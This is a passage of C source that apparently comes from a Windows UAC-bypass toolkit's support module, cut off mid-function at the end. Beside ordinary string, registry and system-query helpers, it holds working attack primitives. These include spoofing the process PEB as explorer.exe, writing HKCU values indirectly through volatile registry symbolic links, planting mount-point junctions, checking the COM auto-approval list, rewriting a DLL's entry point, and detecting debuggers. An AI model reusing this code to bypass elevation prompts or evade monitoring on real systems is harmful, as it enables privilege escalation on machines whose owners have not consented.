            return;
        }
    }

    RtlAcquirePebLock();

    if (Restore) {
        CommandLine = g_LdrBackup.CommandLine;
        ImageFileName = g_LdrBackup.ImagePathName;
    }
    else {
        g_LdrBackup.ImagePathName = Peb->ProcessParameters->ImagePathName.Buffer;
        g_LdrBackup.CommandLine = Peb->ProcessParameters->CommandLine.Buffer;

        ImageFileName = g_lpszExplorer;
        CommandLine = EXPLORER_EXE;
    }

    RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);

    if (Restore) {

        RegionSize = 0;
        NtFreeVirtualMemory(
            NtCurrentProcess(),
            (PVOID*)&g_lpszExplorer,
            &RegionSize,
            MEM_RELEASE);

        g_lpszExplorer = NULL;

    }

    RtlReleasePebLock();

    LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, IntToPtr(Restore));
}

/*
* supExpandEnvironmentStrings
*
* Purpose:
*
* Native ExpandEnvironmetStrings.
*
*/
DWORD supExpandEnvironmentStrings(
    _In_ LPCWSTR lpSrc,
    _In_ LPWSTR lpDst,
    _In_ DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return (DWORD)(Length / sizeof(WCHAR));
    }
    else {
        supSetLastErrorFromNtStatus(Status);
        return 0;
    }
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname,
    wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindLoaderEntry
*
* Purpose:
*
* Return loader entry filename for sxs dll.
*
*/
BOOL sxsFindLoaderEntry(
    _In_ PSXS_SEARCH_CONTEXT Context
)
{
    NTSTATUS Status;
    HANDLE hDll = NULL;
    UNICODE_STRING usDll;

    PLDR_DATA_TABLE_ENTRY LdrTableEntry = NULL;

    RtlInitUnicodeString(&usDll, Context->DllName);

    Status = LdrGetDllHandle(
        NULL,
        NULL,
        &usDll,
        &hDll);

    if (NT_SUCCESS(Status)) {

        Status = LdrFindEntryForAddress(
            hDll,
            &LdrTableEntry);

        if (NT_SUCCESS(Status)) {

            if (_strstri(
                LdrTableEntry->FullDllName.Buffer,
                L".local") == NULL)
            {
                if (_strstri(
                    LdrTableEntry->FullDllName.Buffer,
                    Context->SxsKey))
                {
                    sxsFilePathNoSlash(
                        LdrTableEntry->FullDllName.Buffer,
                        Context->FullDllPath);

                }
                else
                    Status = STATUS_NOT_FOUND;
            }
            else
                Status = STATUS_TOO_LATE;
        }
    }

    return NT_SUCCESS(Status);
}

/*
* supFindPattern
*
* Purpose:
*
* Lookup pattern in buffer.
*
*/
PVOID supFindPattern(
    _In_ CONST PBYTE Buffer,
    _In_ SIZE_T BufferSize,
    _In_ CONST PBYTE Pattern,
    _In_ SIZE_T PatternSize
)
{
    PBYTE	p = Buffer;

    if (PatternSize == 0)
        return NULL;
    if (BufferSize < PatternSize)
        return NULL;
    BufferSize -= PatternSize;

    do {
        p = (PBYTE)memchr(p, Pattern[0], BufferSize - (p - Buffer));
        if (p == NULL)
            break;

        if (memcmp(p, Pattern, PatternSize) == 0)
            return p;

        p++;
    } while (BufferSize - (p - Buffer) > 0); //-V555

    return NULL;
}

/*
* supNativeGetProcAddress
*
* Purpose:
*
* Simplified native GetProcAddress.
*
*/
PVOID supNativeGetProcAddress(
    _In_ WCHAR *Module,
    _In_ CHAR *Routine
)
{
    PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
    UNICODE_STRING   DllName;
    ANSI_STRING      str;

    RtlInitUnicodeString(&DllName, Module);
    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
        return NULL;

    RtlSecureZeroMemory(&str, sizeof(str));
    RtlInitString(&str, Routine);
    if (!NT_SUCCESS(LdrGetProcedureAddress(DllImageBase, &str, 0, &ProcedureAddress)))
        return NULL;

    return ProcedureAddress;
}

/*
* supxDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
*/
BOOL supxDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    LPWSTR lpEnd;
    LONG lResult;
    DWORD dwSize;
    WCHAR szName[MAX_PATH + 1];
    HKEY hKey;
    FILETIME ftWrite;

    //
    // Attempt to delete key as is.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    //
    // Try to open key to check if it exist.
    //
    lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        else
            return FALSE;
    }

    //
    // Add slash to the key path if not present.
    //
    lpEnd = _strend(lpSubKey);
    if (*(lpEnd - 1) != TEXT('\\')) {
        *lpEnd = TEXT('\\');
        lpEnd++;
        *lpEnd = TEXT('\0');
    }

    //
    // Enumerate subkeys and call this func for each.
    //
    dwSize = MAX_PATH;
    lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
        NULL, NULL, &ftWrite);

    if (lResult == ERROR_SUCCESS) {

        do {

            _strncpy(lpEnd, MAX_PATH, szName, MAX_PATH);

            if (!supxDeleteKeyRecursive(hKeyRoot, lpSubKey))
                break;

            dwSize = MAX_PATH;

            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

    //
    // Delete current key, all it subkeys should be already removed.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}

/*
* supRegDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];
    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
}

/*
* supSetEnvVariable
*
* Purpose:
*
* Remove or set current user environment variable.
*
*/
BOOL supSetEnvVariable(
    _In_ BOOL fRemove,
    _In_opt_ LPWSTR lpKeyName,
    _In_ LPWSTR lpVariableName,
    _In_opt_ LPWSTR lpVariableData
)
{
    BOOL    bResult = FALSE, bCond = FALSE;
    HKEY    hKey = NULL;
    DWORD   cbData;

    LPWSTR lpSubKey;

    do {
        if (lpVariableName == NULL)
            break;

        if (lpKeyName == NULL)
            lpSubKey = L"Environment";
        else
            lpSubKey = lpKeyName;

        if ((lpVariableData == NULL) && (fRemove == FALSE))
            break;

        if (RegOpenKey(HKEY_CURRENT_USER, lpSubKey, &hKey) != ERROR_SUCCESS)
            break;

        if (fRemove) {
            bResult = (RegDeleteValue(hKey, lpVariableName) == ERROR_SUCCESS);
        }
        else {
            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
            bResult = (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
                (BYTE*)lpVariableData, cbData) == ERROR_SUCCESS);
        }

    } while (bCond);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return bResult;
}

/*
* supDeleteMountPoint
*
* Purpose:
*
* Removes reparse point of type mount_point.
*
*/
BOOL supDeleteMountPoint(
    _In_ HANDLE hDirectory
)
{
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_GUID_DATA_BUFFER Buffer;

    RtlSecureZeroMemory(&Buffer, sizeof(REPARSE_GUID_DATA_BUFFER));
    Buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;

    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_DELETE_REPARSE_POINT,
        &Buffer,
        REPARSE_GUID_DATA_BUFFER_HEADER_SIZE,
        NULL,
        0);

    if (status == STATUS_NOT_A_REPARSE_POINT) {
        SetLastError(ERROR_INVALID_PARAMETER);
    }
    else {
        supSetLastErrorFromNtStatus(status);
    }

    return NT_SUCCESS(status);
}

/*
* supSetMountPoint
*
* Purpose:
*
* Install reparse point of type mount_point to target.
*
*/
BOOL supSetMountPoint(
    _In_ HANDLE hDirectory,
    _In_ LPWSTR lpTarget,
    _In_ LPWSTR lpPrintName
)
{
    ULONG           memIO;
    USHORT          cbTarget, cbPrintName, reparseDataLength;
    NTSTATUS        status;
    IO_STATUS_BLOCK IoStatusBlock;

    REPARSE_DATA_BUFFER *Buffer;

    if ((lpTarget == NULL) || (lpPrintName == NULL)) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    //
    // Calculate required buffer size.
    // Header + length of input strings + safe space.
    //
    cbTarget = (USHORT)(_strlen(lpTarget) * sizeof(WCHAR));
    cbPrintName = (USHORT)(_strlen(lpPrintName) * sizeof(WCHAR));

    reparseDataLength = cbTarget + cbPrintName + 12;
    memIO = (ULONG)(reparseDataLength + REPARSE_DATA_BUFFER_HEADER_LENGTH);

    Buffer = (REPARSE_DATA_BUFFER*)supHeapAlloc((SIZE_T)memIO);
    if (Buffer == NULL)
        return FALSE;

    //
    // Setup reparse point structure.
    //
    Buffer->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Buffer->ReparseDataLength = reparseDataLength;

    //
    // Add Target to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Buffer->MountPointReparseBuffer.SubstituteNameLength = cbTarget;

    RtlCopyMemory(Buffer->MountPointReparseBuffer.PathBuffer,
        lpTarget,
        cbTarget);

    //
    // Add PrintName to PathBuffer.
    //
    Buffer->MountPointReparseBuffer.PrintNameOffset = cbTarget + sizeof(UNICODE_NULL);
    Buffer->MountPointReparseBuffer.PrintNameLength = cbPrintName;

    RtlCopyMemory(&Buffer->MountPointReparseBuffer.PathBuffer[(cbTarget / sizeof(WCHAR)) + 1],
        lpPrintName,
        cbPrintName);

    //
    // Set reparse point.
    //
    status = NtFsControlFile(hDirectory,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        FSCTL_SET_REPARSE_POINT,
        Buffer,
        memIO,
        NULL,
        0);

    supHeapFree(Buffer);

    supSetLastErrorFromNtStatus(status);
    return NT_SUCCESS(status);
}

/*
* supOpenDirectoryForReparse
*
* Purpose:
*
* Open directory handle to set reparse point.
*
*/
HANDLE supOpenDirectoryForReparse(
    _In_ LPWSTR lpDirectory
)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    HANDLE              hReparseDirectory = NULL;
    UNICODE_STRING      usReparseDirectory;
    IO_STATUS_BLOCK     IoStatusBlock;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    usReparseDirectory.Buffer = NULL;
    if (RtlDosPathNameToNtPathName_U(lpDirectory, &usReparseDirectory, NULL, NULL)) {

        InitializeObjectAttributes(&ObjectAttributes, &usReparseDirectory, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(&hReparseDirectory,
            FILE_ALL_ACCESS,
            &ObjectAttributes,
            &IoStatusBlock,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            FILE_OPEN,
            FILE_OPEN_REPARSE_POINT | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);

        RtlFreeUnicodeString(&usReparseDirectory);
    }

    supSetLastErrorFromNtStatus(status);

    return hReparseDirectory;
}

/*
* supWinstationToName
*
* Purpose:
*
* Retrieves winstation string name.
*
*/
BOOL supWinstationToName(
    _In_opt_ HWINSTA hWinsta,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HWINSTA hObject;

    if (hWinsta == NULL)
        hObject = GetProcessWindowStation();
    else
        hObject = hWinsta;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supDesktopToName
*
* Purpose:
*
* Retrieves desktop string name.
*
*/
BOOL supDesktopToName(
    _In_opt_ HDESK hDesktop,
    _In_ LPWSTR lpBuffer,
    _In_ DWORD cbBuffer,
    _Out_ PDWORD BytesNeeded
)
{
    HDESK hObject;

    if (hDesktop == NULL)
        hObject = GetThreadDesktop(GetCurrentThreadId());
    else
        hObject = hDesktop;

    return GetUserObjectInformation(
        hObject,
        UOI_NAME,
        lpBuffer,
        cbBuffer,
        BytesNeeded);
}

/*
* supQueryNtBuildNumber
*
* Purpose:
*
* Query NtBuildNumber value from ntoskrnl image.
*
*/
BOOL supQueryNtBuildNumber(
    _Inout_ PULONG BuildNumber
)
{
    BOOL bResult = FALSE;
    HMODULE hModule;
    PVOID Ptr;
    WCHAR szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
    _strcat(szBuffer, L"\\system32\\ntoskrnl.exe");

    hModule = LoadLibraryEx(szBuffer, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hModule == NULL)
        return bResult;

#pragma warning(push)
#pragma warning(disable: 4054)//code to data
    Ptr = (PVOID)GetProcAddress(hModule, "NtBuildNumber");
#pragma warning(pop)
    if (Ptr) {
        *BuildNumber = (*(PULONG)Ptr & 0xffff);
        bResult = TRUE;
    }
    FreeLibrary(hModule);
    return bResult;
}

/*
* supReplaceDllEntryPoint
*
* Purpose:
*
* Replace DLL entry point and optionally convert dll to exe.
*
*/
BOOL supReplaceDllEntryPoint(
    _In_ PVOID DllImage,
    _In_ ULONG SizeOfDllImage,
    _In_ LPCSTR lpEntryPointName,
    _In_ BOOL fConvertToExe
)
{
    BOOL bResult = FALSE;
    PIMAGE_NT_HEADERS NtHeaders;
    DWORD DllVirtualSize;
    PVOID DllBase, EntryPoint;

    NtHeaders = RtlImageNtHeader(DllImage);
    if (NtHeaders) {

        DllVirtualSize = 0;
        DllBase = PELoaderLoadImage(DllImage, &DllVirtualSize);
        if (DllBase) {
            //
            // Get the new entrypoint.
            //
            EntryPoint = PELoaderGetProcAddress(DllBase, (PCHAR)lpEntryPointName);
            if (EntryPoint) {
                //
                // Set new entrypoint and recalculate checksum.
                //
                NtHeaders->OptionalHeader.AddressOfEntryPoint =
                    (ULONG)((ULONG_PTR)EntryPoint - (ULONG_PTR)DllBase);

                if (fConvertToExe)
                    NtHeaders->FileHeader.Characteristics &= ~IMAGE_FILE_DLL;

                NtHeaders->OptionalHeader.CheckSum =
                    supCalculateCheckSumForMappedFile(DllImage, SizeOfDllImage);

                bResult = TRUE;
            }
            VirtualFree(DllBase, 0, MEM_RELEASE);
        }
    }
    return bResult;
}

/*
* supQuerySystemRoot
*
* Purpose:
*
* Query system root value from registry to the program global context.
*
*/
BOOL supQuerySystemRoot(
    _Inout_ PVOID Context)
{
    BOOL                bCond = FALSE, bResult = FALSE, needBackslash = FALSE;
    NTSTATUS            Status;
    UNICODE_STRING      UString;
    OBJECT_ATTRIBUTES   ObjectAttributes;

    PWCHAR              lpData = NULL;
    SIZE_T              ccm = 0, cch = 0;
    HANDLE              hKey = NULL;

    PUACMECONTEXT       context = (PUACMECONTEXT)Context;

    WCHAR               szBuffer[MAX_PATH];
    WCHAR               szSystem32Prep[] = { L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', 0 };

    ULONG               Length = 0, cbSystem32Prep = sizeof(szSystem32Prep) - sizeof(WCHAR);

    do {
        _strcpy(szBuffer, T_REGISTRY_PREP);
        _strcat(szBuffer, T_WINDOWS_CURRENT_VERSION);
        RtlInitUnicodeString(&UString, szBuffer);

        InitializeObjectAttributes(&ObjectAttributes, &UString, OBJ_CASE_INSENSITIVE, NULL, NULL);
        Status = NtOpenKey(&hKey, KEY_READ, &ObjectAttributes);
        if (!NT_SUCCESS(Status))
            break;

        Status = supRegReadValue(hKey, L"SystemRoot", REG_SZ, (PVOID*)&lpData, &Length, context->ucmHeap);
        if (!NT_SUCCESS(Status) || (lpData == NULL))
            break;

        ccm = Length / sizeof(WCHAR);
        cch = ccm;
        if (lpData[cch - 1] != L'\\') {
            ccm++;
            needBackslash = TRUE;
        }
        else {
            needBackslash = FALSE;
        }

        ccm += (cbSystem32Prep / sizeof(WCHAR));

        if (ccm >= MAX_PATH) {
            SetLastError(ERROR_BUFFER_OVERFLOW);
            break;
        }

        _strncpy(context->szSystemRoot, MAX_PATH, lpData, cch);
        if (needBackslash) {
            context->szSystemRoot[cch - 1] = L'\\';
        }

        _strcpy(context->szSystemDirectory, context->szSystemRoot);
        _strcat(context->szSystemDirectory, szSystem32Prep);

        bResult = TRUE;

    } while (bCond);

    if (hKey) NtClose(hKey);
    if (lpData) RtlFreeHeap(context->ucmHeap, 0, lpData);

    return bResult;
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Returns buffer with system information by given InfoClass.
*
* Returned buffer must be freed with supHeapFree after usage.
* Function will return error after 20 attempts.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS InfoClass
)
{
    INT			c = 0;
    PVOID		Buffer = NULL;
    ULONG		Size = PAGE_SIZE;
    NTSTATUS	status;
    ULONG       memIO;

    do {
        Buffer = supHeapAlloc((SIZE_T)Size);
        if (Buffer != NULL) {
            status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
        }
        else {
            return NULL;
        }
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            supHeapFree(Buffer);
            Buffer = NULL;
            Size *= 2;
            c++;
            if (c > 20) {
                status = STATUS_SECRET_TOO_LONG;
                break;
            }
        }
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    if (NT_SUCCESS(status)) {
        return Buffer;
    }

    if (Buffer) {
        supHeapFree(Buffer);
    }
    return NULL;
}

/*
* supIsCorImageFile
*
* Purpose:
*
* Return true if image has CliHeader entry, false otherwise.
*
*/
BOOL supIsCorImageFile(
    PVOID ImageBase
)
{
    BOOL                bResult = FALSE;
    ULONG               sz = 0;
    IMAGE_COR20_HEADER *CliHeader;

    if (ImageBase) {
        CliHeader = (IMAGE_COR20_HEADER*)RtlImageDirectoryEntryToData(ImageBase, TRUE,
            IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR, &sz);

        if ((CliHeader == NULL) || (sz < sizeof(IMAGE_COR20_HEADER)))
            return bResult;
        bResult = TRUE;
    }
    return bResult;
}

/*
* supRegSetValueIndirectHKCU
*
* Purpose:
*
* Indirectly set registry Value for TargetKey in the current user hive.
*
*/
NTSTATUS supRegSetValueIndirectHKCU(
    _In_ LPWSTR TargetKey,
    _In_opt_ LPWSTR ValueName,
    _In_ LPWSTR lpData,
    _In_ ULONG cbData
)
{
    BOOL bCond = FALSE;
    HANDLE hKey = NULL;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    SIZE_T memIO;

    PWSTR lpLinkKeyBuffer = NULL, lpBuffer = NULL;
    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);
    ULONG dummy;

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = (PWSTR)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

        //
        // Create link key.
        //
        status = NtCreateKey(&hKey, KEY_ALL_ACCESS,
            &obja, 0, NULL,
            REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
            &dummy);

        //
        // If link already created, update it.
        //
        if (status == STATUS_OBJECT_NAME_COLLISION) {

            obja.Attributes |= OBJ_OPENLINK;

            status = NtOpenKey(&hKey,
                KEY_ALL_ACCESS,
                &obja);

        }

        if (!NT_SUCCESS(status))
            break;

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + ((1 + _strlen(TargetKey)) * sizeof(WCHAR));
        lpBuffer = (PWSTR)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpBuffer == NULL)
            break;

        _strcpy(lpBuffer, usCurrentUser.Buffer);
        _strcat(lpBuffer, L"\\");
        _strcat(lpBuffer, TargetKey);

        memIO = _strlen(lpBuffer) * sizeof(WCHAR); //no null termination
        status = NtSetValueKey(hKey, &CmSymbolicLinkValue, 0, REG_LINK, (PVOID)lpBuffer, (ULONG)memIO);
        NtClose(hKey);
        hKey = NULL;

        if (!NT_SUCCESS(status))
            break;

        //
        // Set value indirect.
        //
        obja.Attributes = OBJ_CASE_INSENSITIVE;
        status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &obja);
        if (NT_SUCCESS(status)) {

            //
            // If this is Default value - supply empty US.
            //
            if (ValueName == NULL) {
                RtlSecureZeroMemory(&usLinkPath, sizeof(usLinkPath));
            }
            else {
                RtlInitUnicodeString(&usLinkPath, ValueName);
            }
            status = NtSetValueKey(hKey, &usLinkPath, 0, REG_SZ, (PVOID)lpData, (ULONG)cbData);
            NtClose(hKey);
            hKey = NULL;
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    if (lpBuffer) RtlFreeHeap(hHeap, 0, lpBuffer);
    if (hKey) NtClose(hKey);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* supRemoveRegLinkHKCU
*
* Purpose:
*
* Remove registry symlink for current user.
*
*/
NTSTATUS supRemoveRegLinkHKCU(
    VOID
)
{
    BOOL bCond = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ULONG cbKureND = sizeof(T_SYMLINK) - sizeof(WCHAR);

    UNICODE_STRING usCurrentUser, usLinkPath;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING CmSymbolicLinkValue = RTL_CONSTANT_STRING(L"SymbolicLinkValue");

    HANDLE hHeap = NtCurrentPeb()->ProcessHeap;

    PWSTR lpLinkKeyBuffer = NULL;
    SIZE_T memIO;

    HANDLE hKey = NULL;

    InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = RtlFormatCurrentUserKeyPath(&usCurrentUser);
    if (!NT_SUCCESS(status))
        return status;

    do {

        memIO = sizeof(UNICODE_NULL) + usCurrentUser.MaximumLength + cbKureND;
        lpLinkKeyBuffer = (PWSTR)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, memIO);
        if (lpLinkKeyBuffer == NULL)
            break;

        usLinkPath.Buffer = lpLinkKeyBuffer;
        usLinkPath.Length = 0;
        usLinkPath.MaximumLength = (USHORT)memIO;

        status = RtlAppendUnicodeStringToString(&usLinkPath, &usCurrentUser);
        if (!NT_SUCCESS(status))
            break;

        status = RtlAppendUnicodeToString(&usLinkPath, T_SYMLINK);
        if (!NT_SUCCESS(status))
            break;

        InitializeObjectAttributes(&obja, &usLinkPath, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK, NULL, NULL);

        status = NtOpenKey(&hKey,
            KEY_ALL_ACCESS,
            &obja);

        if (NT_SUCCESS(status)) {

            status = NtDeleteValueKey(hKey, &CmSymbolicLinkValue);
            if (NT_SUCCESS(status))
                status = NtDeleteKey(hKey);

            NtClose(hKey);
        }

    } while (bCond);

    if (lpLinkKeyBuffer) RtlFreeHeap(hHeap, 0, lpLinkKeyBuffer);
    RtlFreeUnicodeString(&usCurrentUser);

    return status;
}

/*
* supIsConsentApprovedInterface
*
* Purpose:
*
* Test if the given interface is in consent COMAutoApprovalList.
*
*/
BOOL supIsConsentApprovedInterface(
    _In_ LPWSTR InterfaceName,
    _Out_ PBOOL IsApproved
)
{
    BOOL                bResult = FALSE;

    UNICODE_STRING      usKey = RTL_CONSTANT_STRING(T_COMAUTOAPPROVALLIST);
    OBJECT_ATTRIBUTES   obja;
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    ULONG               dummy;

    HANDLE              hKey = NULL;

    ULONG               Index = 0;

    BYTE               *Buffer;
    ULONG               Size = PAGE_SIZE;

    PKEY_VALUE_BASIC_INFORMATION ValueInformation;

    UNICODE_STRING      usKeyName, usInterfaceName;

    if (IsApproved)
        *IsApproved = FALSE;

    InitializeObjectAttributes(&obja, &usKey, OBJ_CASE_INSENSITIVE, NULL, NULL);

    bResult = NT_SUCCESS(NtOpenKey(
        &hKey,
        KEY_QUERY_VALUE,
        &obja));

    if (bResult) {

        RtlInitUnicodeString(&usInterfaceName, InterfaceName);

        Buffer = (BYTE*)_alloca(Size);
        ValueInformation = (PKEY_VALUE_BASIC_INFORMATION)Buffer;

        do {

            status = NtEnumerateValueKey(
                hKey,
                Index,
                KeyValueBasicInformation,
                ValueInformation,
                Size,
                &dummy);

            if (NT_SUCCESS(status)) {

                usKeyName.MaximumLength = (USHORT)ValueInformation->NameLength;
                usKeyName.Buffer = ValueInformation->Name;
                usKeyName.Length = (USHORT)ValueInformation->NameLength;

                if (RtlEqualUnicodeString(&usInterfaceName, &usKeyName, TRUE)) {
                    *IsApproved = TRUE;
                    break;
                }
                Index++;
            }
            else
                break;

        } while (status != STATUS_NO_MORE_ENTRIES);

        NtClose(hKey);
    }

    return bResult;
}

/*
* supIsDebugPortPresent
*
* Purpose:
*
* Return TRUE if current process has debug port FALSE otherwise.
*
*/
BOOL supIsDebugPortPresent(
    VOID
)
{
    DWORD_PTR DebugPortPresent = 0, dwBuffer = 0;

    if (NT_SUCCESS(NtQueryInformationProcess(
        NtCurrentProcess(),
        ProcessDebugPort,
        &dwBuffer,
        sizeof(dwBuffer),
        NULL)))
    {
        DebugPortPresent = (dwBuffer != 0);
    }

    return (DebugPortPresent == 1);
}


/*
* supGetProcessMitigationPolicy
*
* Purpose:
*
* Request process mitigation policy values.
*
*/
BOOL supGetProcessMitigationPolicy(
    _In_ HANDLE hProcess,
    _In_ PROCESS_MITIGATION_POLICY Policy,
    _In_ SIZE_T Size,
    _Out_writes_bytes_(Size) PVOID Buffer
)
{
    ULONG Length = 0;

    PROCESS_MITIGATION_POLICY_INFORMATION MitigationPolicy;

    MitigationPolicy.Policy = (PROCESS_MITIGATION_POLICY)Policy;

    if (!NT_SUCCESS(NtQueryInformationProcess(
        hProcess,
        ProcessMitigationPolicy,
        &MitigationPolicy,
        sizeof(PROCESS_MITIGATION_POLICY_INFORMATION),
        &Length)))
    {
        return FALSE;
    }

    RtlCopyMemory(Buffer, &MitigationPolicy, Size);

    return TRUE;
}

/*
* supGetRemoteCodeExecPolicies
*
* Purpose:
*
* Request specific process mitigation policy values all at once.
* Use RtlFreeHeap to release returned buffer.
*
*/
UCM_PROCESS_MITIGATION_POLICIES *supGetRemoteCodeExecPolicies(
    _In_ HANDLE hProcess
)
{
    UCM_PROCESS_MITIGATION_POLICIES *Policies = NULL;

    Policies = (UCM_PROCESS_MITIGATION_POLICIES*)RtlAllocateHeap(
        NtCurrentPeb()->ProcessHeap,
        HEAP_ZERO_MEMORY,
        sizeof(UCM_PROCESS_MITIGATION_POLICIES));

    if (Policies == NULL)
        return NULL;

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessExtensionPointDisablePolicy,
        sizeof(PROCESS_MITIGATION_EXTENSION_POINT_DISABLE_POLICY),
        &Policies->ExtensionPointDisablePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessSignaturePolicy,
        sizeof(PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY_W10),
        &Policies->SignaturePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessDynamicCodePolicy,
        sizeof(PROCESS_MITIGATION_DYNAMIC_CODE_POLICY_W10),
        &Policies->DynamicCodePolicy);

    supGetProcessMitigationPolicy(
        hProcess,
        (PROCESS_MITIGATION_POLICY)ProcessImageLoadPolicy,
